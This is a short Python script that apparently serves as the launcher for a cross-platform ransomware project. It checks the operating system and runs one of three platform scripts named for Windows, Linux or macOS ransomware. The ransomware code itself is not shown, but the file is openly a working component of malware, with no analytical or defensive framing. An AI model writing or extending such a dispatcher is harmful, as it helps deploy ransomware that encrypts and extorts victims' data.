import platform
import subprocess

os_name = platform.system().lower()

if os_name == "windows":
    subprocess.run(["python", "platforms/windows_ransom.py"])
elif os_name == "linux":
    subprocess.run(["python3", "platforms/linux_ransom.py"])
elif os_name == "darwin":
    subprocess.run(["python3", "platforms/macos_ransom.py"])
else:
    print("Unsupported OS")
